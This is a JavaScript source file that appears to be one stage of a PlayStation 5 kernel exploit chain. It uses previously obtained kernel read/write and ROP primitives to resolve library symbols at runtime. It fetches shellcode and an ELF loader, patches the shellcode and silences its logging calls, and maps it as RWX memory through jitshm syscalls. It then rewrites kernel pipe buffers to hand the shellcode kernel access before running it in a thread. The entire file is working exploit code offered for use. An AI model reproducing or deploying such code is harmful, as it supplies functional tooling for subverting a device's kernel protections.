import { int64 } from "./int64.js";

const SYS_MUNMAP = 0x049;
const SYS_MMAP = 0x1dd;
const SYS_JITSHM_CREATE = 0x215;
const SYS_JITSHM_ALIAS = 0x216;
const SYS_PIPE2 = 0x2af;

const O_NONBLOCK = 0x4;
const PROT_RW = 0x3,
  PROT_RWX = 0x7;
const MAP_SHARED = 0x1,
  MAP_PRIVATE_ANON = 0x1002;

const DEFAULT_SHELLCODE = "kexp_2026_05_25.bin";
const DEFAULT_ELF_LOADER = "elfldr-ps5-1360.elf";

/** The blob this patch set was derived from, and the bytes that identify it. */
const BLOB = {
  size: 18912,
  resolverCallA: { at: 0x1c, bytes: [0xe8, 0xcf, 0x00, 0x00, 0x00] },
  resolverCallB: { at: 0x23, bytes: [0xe8, 0x78, 0x01, 0x00, 0x00] },
  getpidCall: {
    at: 0x10f1,
    bytes: [
      0x48,
      0x8d,
      0x35,
      0xac,
      0x30,
      0x00,
      0x00, // lea rsi, [rip+0x30ac]
      0x48,
      0x8d,
      0x55,
      0xd0, // lea rdx, [rbp-0x30]
      0xbf,
      0x01,
      0x20,
      0x00,
      0x00, // mov edi, 0x2001
      0xe8,
      0x41,
      0x2b,
      0x00,
      0x00, // call resolver
    ],
    // mov rax, <getpid> replaces the block; then store and zero eax.
    tail: [0x48, 0x89, 0x45, 0xd0, 0x31, 0xc0],
    tailAt: 0x10fb,
    padFrom: 0x1101,
    padTo: 0x1106,
  },
  logCalls: [0x126d, 0x12ad, 0x3bc2],
  // Absolute function pointers the shellcode calls through, in blob order.
  pointerSlots: [
    [0x48b0, "libkernel", "sceKernelSendNotificationRequest"],
    [0x48b8, "libkernel", "sysctlbyname"],
    [0x48c0, "libkernel", "pthread_create"],
    [0x48c8, "libkernel", "pthread_join"],
    [0x48d0, "libc", "malloc"],
    [0x48d8, "libc", "free"],
    [0x48e0, "libc", "memcpy"],
    [0x48e8, "libc", "memset"],
    [0x48f0, "libc", "strcmp"],
    [0x48f8, "libc", "memcmp"],
    [0x4900, "libc", "vsnprintf"],
  ],
};

/** Symbols the shellcode needs, by module. */
const NEEDED = {
  libkernel: [
    "sceKernelSendNotificationRequest",
    "sysctlbyname",
    "pthread_create",
    "pthread_join",
    "getpid",
  ],
  libc: ["malloc", "free", "memcpy", "memset", "strcmp", "memcmp", "vsnprintf"],
};

/** struct pipe.pipe_buffer, and the filedesc walk that finds one from an fd. */
const PIPE = {
  count: 0x00,
  in: 0x04,
  out: 0x08,
  size: 0x0c,
  buffer: 0x10,
  defaultSize: 0x4000,
};
const FD_ENTRY = { ofiles: 0x08, stride: 0x30, data: 0x00 };

// ---- little-endian helpers over a Uint8Array --------------------------------

function readU32(bytes, offset) {
  return (
    (bytes[offset] |
      (bytes[offset + 1] << 8) |
      (bytes[offset + 2] << 16) |
      (bytes[offset + 3] << 24)) >>>
    0
  );
}

function writeU64(bytes, offset, value) {
  let rest = BigInt(value) & 0xffffffffffffffffn;
  for (let i = 0; i < 8; i++) {
    bytes[offset + i] = Number(rest & 0xffn);
    rest >>= 8n;
  }
}

function matches(bytes, offset, expected) {
  return expected.every((byte, i) => bytes[offset + i] === byte);
}

function hex(value) {
  if (value instanceof int64) return "0x" + value.toString(16);
  return "0x" + (Number(value) >>> 0).toString(16);
}

function readSymbols(p, base, wanted) {
  const u8 = (a) => p.read1(a) & 0xff;
  const u16 = (a) => (p.read1(a) | (p.read1(a.add32(1)) << 8)) >>> 0;
  const u32 = (a) => p.read4(a) >>> 0;
  const u64 = (a) => p.read8(a);

  if (
    u8(base) !== 0x7f ||
    u8(base.add32(1)) !== 0x45 ||
    u8(base.add32(2)) !== 0x4c ||
    u8(base.add32(3)) !== 0x46
  )
    throw new Error("kexp: " + hex(base) + " is not an ELF image");

  const phoff = u64(base.add32(0x20));
  const phentsize = u16(base.add32(0x36));
  const phnum = u16(base.add32(0x38));
  if (phentsize !== 0x38 || phnum === 0 || phnum > 0x40)
    throw new Error("kexp: implausible program header table at " + hex(base));

  let dynamic = null;
  for (let i = 0; i < phnum && dynamic === null; i++) {
    const header = base.add32(phoff.low + i * 0x38);
    if (u32(header) === 2) dynamic = u64(header.add32(0x10)).low; // PT_DYNAMIC
  }
  if (dynamic === null) throw new Error("kexp: no PT_DYNAMIC in " + hex(base));

  const absolute = (value) =>
    value.hi === 0 && value.low < 0x20000000 ? base.add32(value.low) : value;

  let strtab = null,
    symtab = null,
    hash = null,
    strsz = 0,
    syment = 0x18;
  const dynBase = base.add32(dynamic);
  for (let offset = 0; offset < 0x4000; offset += 0x10) {
    const tag = u64(dynBase.add32(offset)).low >>> 0;
    if (tag === 0) break;
    const value = u64(dynBase.add32(offset + 8));
    if (tag === 4) hash = value;
    else if (tag === 5) strtab = value;
    else if (tag === 6) symtab = value;
    else if (tag === 10) strsz = value.low >>> 0;
    else if (tag === 11) syment = value.low >>> 0;
  }
  if (!strtab || !symtab || syment < 16)
    throw new Error("kexp: incomplete dynamic section in " + hex(base));

  const strings = absolute(strtab);
  const symbols = absolute(symtab);

  let limit = 0x80000;
  if (hash) {
    const nchain = u32(absolute(hash).add32(4));
    if (nchain > 0 && nchain < limit) limit = nchain;
  }

  const found = {};
  const missing = new Set(wanted);
  for (let i = 0; i < limit && missing.size; i++) {
    const symbol = symbols.add32(i * syment);

    let nameOffset;
    try {
      nameOffset = u32(symbol);
    } catch (e) {
      break;
    }
    if (nameOffset === 0 || (strsz && nameOffset >= strsz)) continue;

    let name = "";
    for (let c = 0; c < 96; c++) {
      const byte = u8(strings.add32(nameOffset + c));
      if (byte === 0) break;
      name += String.fromCharCode(byte);
    }
    if (missing.has(name)) {
      found[name] = u64(symbol.add32(8)).low >>> 0;
      missing.delete(name);
    }
  }

  if (missing.size)
    throw new Error(
      "kexp: " +
        hex(base) +
        " does not export " +
        Array.from(missing).join(", "),
    );
  return found;
}

/**
 * Merge the firmware table's static offsets with whatever has to be resolved at
 * runtime, per module.
 */
function resolveSymbols(p, log) {
  const bases = { libkernel: p.libKernelBase, libc: p.libSceLibcInternalBase };
  const published = window.SYMBOLS || {};
  const resolved = {};

  for (const [group, names] of Object.entries(NEEDED)) {
    const base = bases[group];
    if (!base || (base.low === 0 && base.hi === 0))
      throw new Error("kexp: " + group + " base is unresolved");

    const table = published[group] || {};
    const offsets = {};
    const unknown = [];
    for (const name of names) {
      if (typeof table[name] === "number") offsets[name] = table[name] >>> 0;
      else unknown.push(name);
    }
    if (unknown.length) Object.assign(offsets, readSymbols(p, base, unknown));

    // A firmware table may publish more than the minimum -- notably
    // pthread_create_name_np, which the spawn prefers but does not require.
    for (const [name, value] of Object.entries(table))
      if (typeof value === "number" && offsets[name] === undefined)
        offsets[name] = value >>> 0;

    resolved[group] = { base, offsets };
    if (unknown.length)
      log("resolved " + unknown.length + " " + group + " symbol(s) at runtime");
  }
  return resolved;
}

// ---- shellcode preparation --------------------------------------------------

async function fetchBinary(config, name) {
  const url = ((config && config.payloadUrl) || "payloads/") + name;
  const response = await fetch(url);
  if (!response.ok)
    throw new Error("kexp: GET " + url + " -> HTTP " + response.status);
  return new Uint8Array(await response.arrayBuffer());
}

/**
 * Rewrite the blob in place: bypass its resolver and point every call at the
 * addresses this process actually loaded the libraries at.
 */
function patchShellcode(blob, symbols) {
  if (blob.length !== BLOB.size)
    throw new Error(
      "kexp: expected a " + BLOB.size + " byte blob, got " + blob.length,
    );
  if (
    !matches(blob, BLOB.resolverCallA.at, BLOB.resolverCallA.bytes) ||
    !matches(blob, BLOB.resolverCallB.at, BLOB.resolverCallB.bytes) ||
    !matches(blob, BLOB.getpidCall.at, BLOB.getpidCall.bytes)
  )
    throw new Error(
      "kexp: signature check failed -- this blob is not the one these" +
        " patches were derived from",
    );

  for (let i = 0; i < 5; i++) {
    blob[BLOB.resolverCallA.at + i] = 0x90;
    blob[BLOB.resolverCallB.at + i] = 0x90;
  }

  const addressOf = (group, name) => {
    const { base, offsets } = symbols[group];
    return (
      ((BigInt(base.hi) << 32n) | BigInt(base.low >>> 0)) +
      BigInt(offsets[name])
    );
  };
  for (const [slot, group, name] of BLOB.pointerSlots)
    writeU64(blob, slot, addressOf(group, name));

  // Replace the resolver call for getpid with `mov rax, <getpid>` followed by
  // the original store, and pad what is left of the block with NOPs.
  const { at, tail, tailAt, padFrom, padTo } = BLOB.getpidCall;
  blob[at] = 0x48;
  blob[at + 1] = 0xb8;
  writeU64(blob, at + 2, addressOf("libkernel", "getpid"));
  tail.forEach((byte, i) => {
    blob[tailAt + i] = byte;
  });
  for (let i = padFrom; i < padTo; i++) blob[i] = 0x90;

  let silenced = 0;
  for (const offset of BLOB.logCalls) {
    if (blob[offset] !== 0xe8) continue;
    for (let i = 0; i < 5; i++) blob[offset + i] = 0x90;
    silenced++;
  }
  return { silenced };
}

async function mapExecutable(blob, p, chain) {
  const length = (blob.length + 0x3fff) & ~0x3fff;
  const failed = (value) => value.low >>> 0 === 0xffffffff;

  const execFd = await chain.syscall(SYS_JITSHM_CREATE, 0, length, PROT_RWX);
  if (failed(execFd) || execFd.low >= 0x100000)
    throw new Error("kexp: jitshm_create was denied (" + hex(execFd) + ")");

  const entry = await chain.syscall(
    SYS_MMAP,
    0,
    length,
    PROT_RWX,
    MAP_SHARED,
    execFd,
    0,
  );
  if (failed(entry) || entry.low < 0x10000)
    throw new Error(
      "kexp: RWX mmap of the jitshm object failed (" + hex(entry) + ")",
    );

  const copyInto = (dest) => {
    const wholeDwords = blob.length & ~3;
    for (let o = 0; o < wholeDwords; o += 4)
      p.write4(dest.add32(o), readU32(blob, o));
    for (let o = wholeDwords; o < blob.length; o++)
      p.write1(dest.add32(o), blob[o]);
    for (let o = 0; o < wholeDwords; o += 4)
      if (p.read4(dest.add32(o)) >>> 0 !== readU32(blob, o)) return false;
    return true;
  };

  if (!copyInto(entry)) {
    const writeFd = await chain.syscall(SYS_JITSHM_ALIAS, execFd, PROT_RW);
    if (failed(writeFd) || writeFd.low >= 0x100000)
      throw new Error(
        "kexp: the RWX copy did not land and jitshm_alias failed",
      );

    const writable = await chain.syscall(
      SYS_MMAP,
      0,
      length,
      PROT_RW,
      MAP_SHARED,
      writeFd,
      0,
    );
    if (failed(writable) || writable.low < 0x10000)
      throw new Error(
        "kexp: jitshm_alias gave no writable mapping (" + hex(writable) + ")",
      );

    if (!copyInto(writable) || p.read4(entry) >>> 0 !== readU32(blob, 0))
      throw new Error("kexp: the alias copy did not land either, not spawning");
    await chain.syscall(SYS_MUNMAP, writable, length);
  }

  return entry;
}

// ---- kernel R/W bootstrap for the shellcode ---------------------------------

async function makePipePair(p, chain) {
  const fds = p.malloc(8, 1);
  const rv = (await chain.syscall(SYS_PIPE2, fds, O_NONBLOCK)).low | 0;
  if (rv < 0) throw new Error("kexp: pipe2 failed (" + rv + ")");

  const readFd = p.read4(fds) >>> 0;
  const writeFd = p.read4(fds.add32(4)) >>> 0;
  if (!readFd || !writeFd || readFd >= 0x100000 || writeFd >= 0x100000)
    throw new Error("kexp: implausible pipe fds " + readFd + "/" + writeFd);
  return { readFd, writeFd };
}

async function prepareShellcodePipes(krw, master, victim, log) {
  const pipeOf = async (fd) => {
    const table = await krw.read8(krw.procFdAddr);
    const file = await krw.read8(
      table.add32(FD_ENTRY.ofiles + fd * FD_ENTRY.stride),
    );
    return krw.read8(file.add32(FD_ENTRY.data));
  };

  const masterPipe = await pipeOf(master.readFd);
  const victimPipe = await pipeOf(victim.readFd);

  await krw.write4(masterPipe.add32(PIPE.count), 0);
  await krw.write4(masterPipe.add32(PIPE.in), 0);
  await krw.write4(masterPipe.add32(PIPE.out), 0);
  await krw.write4(masterPipe.add32(PIPE.size), PIPE.defaultSize);
  await krw.write8(masterPipe.add32(PIPE.buffer), victimPipe);

  const readBack = await krw.read8(masterPipe.add32(PIPE.buffer));
  if (readBack.low !== victimPipe.low || readBack.hi !== victimPipe.hi)
    throw new Error(
      "kexp: pipe bootstrap failed, master buffer is " +
        hex(readBack) +
        " not " +
        hex(victimPipe),
    );
  log(
    "pipe bootstrap: master=" +
      hex(masterPipe) +
      " -> victim=" +
      hex(victimPipe),
  );
}

async function spawnAndJoin(entry, args, symbols, p, chain, log) {
  const { base, offsets } = symbols.libkernel;
  const create =
    offsets.pthread_create_name_np !== undefined
      ? offsets.pthread_create_name_np
      : offsets.pthread_create;

  const handle = p.malloc(8);
  const result = p.malloc(8);
  const name = p.stringify("payload");
  p.write8(handle, 0);
  p.write8(result, 0);

  const created = await chain.call(
    base.add32(create),
    handle,
    new int64(0, 0),
    entry,
    args,
    name,
  );
  if (created.low >>> 0 !== 0)
    throw new Error("kexp: pthread_create_name_np returned " + hex(created));

  const thread = p.read8(handle);
  log("thread " + hex(thread) + " created, joining");

  const joined = await chain.call(
    base.add32(offsets.pthread_join),
    thread,
    result,
  );
  return { joinResult: joined.low >>> 0, shellcodeResult: p.read8(result) };
}

// ---- entry point ------------------------------------------------------------

/**
 * @param {object} krw    kernel read/write API from exploit.js
 * @param {object} p      userland primitive
 * @param {object} chain  ROP worker
 * @param {function} log  progress sink
 * @param {object} config optional { kexp, elfldr, payloadUrl }
 * @returns {Promise<boolean>} true once the shellcode thread joined cleanly
 */
export async function runKexp(krw, p, chain, log, config) {
  config = config || {};
  const say = typeof log === "function" ? log : () => {};

  const allprocRva = window.KRW && window.KRW.allproc;
  if (typeof allprocRva !== "number")
    throw new Error("kexp: window.KRW.allproc is not set for this firmware");
  if (!krw || !krw.ktextBase)
    throw new Error("kexp: no kernel R/W was handed over");

  const allproc = krw.ktextBase.add32(allprocRva);
  if ((allproc.hi & 0xffff0000) >>> 0 !== 0xffff0000)
    throw new Error(
      "kexp: allproc " + hex(allproc) + " is not a kernel pointer",
    );

  const symbols = resolveSymbols(p, say);

  // The ELF loader travels as raw data in anonymous RW memory; the shellcode
  // is what gives it a home in the kernel.
  const elf = await fetchBinary(config, config.elfldr || DEFAULT_ELF_LOADER);
  if (elf.length < 0x1000 || readU32(elf, 0) !== 0x464c457f)
    throw new Error(
      "kexp: the elfldr payload is not an ELF (" + elf.length + " bytes)",
    );

  const elfMapped = (elf.length + 0x3fff) & ~0x3fff;
  const elfBase = await chain.syscall(
    SYS_MMAP,
    0,
    elfMapped,
    PROT_RW,
    MAP_PRIVATE_ANON,
    -1,
    0,
  );
  if (elfBase.low >>> 0 === 0xffffffff || elfBase.low < 0x10000)
    throw new Error(
      "kexp: could not map " + elfMapped + " bytes for the elfldr payload",
    );

  const wholeDwords = elf.length & ~3;
  for (let o = 0; o < wholeDwords; o += 4)
    p.write4(elfBase.add32(o), readU32(elf, o));
  for (let o = wholeDwords; o < elf.length; o++)
    p.write1(elfBase.add32(o), elf[o]);
  if (p.read4(elfBase) >>> 0 !== 0x464c457f)
    throw new Error(
      "kexp: the elfldr payload did not read back from " + hex(elfBase),
    );
  say("elfldr payload at " + hex(elfBase) + ", " + elf.length + " bytes");

  const blob = await fetchBinary(config, config.kexp || DEFAULT_SHELLCODE);
  const { silenced } = patchShellcode(blob, symbols);
  const entry = await mapExecutable(blob, p, chain);
  say(
    "shellcode mapped RWX at " +
      hex(entry) +
      " (" +
      silenced +
      "/3 log calls silenced)",
  );

  const master = await makePipePair(p, chain);
  const victim = await makePipePair(p, chain);
  if (!krw.procFdAddr)
    throw new Error("kexp: no filedesc address, the pipe bootstrap cannot run");
  await prepareShellcodePipes(krw, master, victim, say);

  const args = p.malloc(0x28);
  for (let o = 0; o < 0x28; o += 8) p.write8(args.add32(o), 0);
  p.write4(args.add32(0x00), master.readFd);
  p.write4(args.add32(0x04), master.writeFd);
  p.write4(args.add32(0x08), victim.readFd);
  p.write4(args.add32(0x0c), victim.writeFd);
  p.write8(args.add32(0x10), allproc);
  p.write8(args.add32(0x18), elfBase);
  p.write8(args.add32(0x20), elf.length);

  const { joinResult, shellcodeResult } = await spawnAndJoin(
    entry,
    args,
    symbols,
    p,
    chain,
    say,
  );
  say("join=" + hex(joinResult) + " shellcode=" + hex(shellcodeResult));
  if (joinResult !== 0)
    throw new Error(
      "kexp: join returned " + hex(joinResult) + ", the shellcode crashed",
    );

  return true;
}
